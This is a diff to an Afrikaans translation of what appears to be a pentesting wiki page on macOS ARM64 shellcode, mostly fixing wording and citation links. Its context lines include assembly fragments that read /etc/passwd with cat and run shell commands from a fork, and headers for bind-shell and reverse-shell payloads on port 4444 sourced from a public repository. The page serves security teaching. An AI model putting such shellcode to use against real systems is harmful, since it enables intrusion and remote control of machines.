 - Indien steeds hier (= alles anders het misluk), probeer forwarder
 
 ### Shellcodes
@@ -482,7 +482,7 @@ return 0;
 
 #### Shell
 
-Geneem vanaf [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.<sup>[1]</sup>
+Geneem van [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.<sup>[[1]](#references)</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -554,7 +554,7 @@ sh_path: .asciz "/bin/sh"
 
 #### Lees met cat
 
-Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus is die tweede argument (x1) ’n array van parameters (wat in memory ’n stapel van adresse beteken).
+Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus is die tweede argument (x1) ’n skikking van parameters (wat in die geheue ’n stapel van die adresse beteken).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -580,7 +580,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### Voer opdrag met sh vanaf 'n fork uit sodat die hoofproses nie beëindig word nie
+#### Voer opdrag met sh vanuit ’n fork uit sodat die hoofproses nie beëindig word nie
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -626,7 +626,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bind shell
 
-Bind shell vanaf [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) op **poort 4444**<sup>[2]</sup>
+Bind shell vanaf [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) op **poort 4444**<sup>[[2]](#references)</sup>.
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -710,7 +710,7 @@ svc  #0x1337
 ```
 #### Reverse shell
 
-Vanaf [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**<sup>[3]</sup>.
+Vanaf [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
 ```armasm
 .section __TEXT,__text
 .global _main
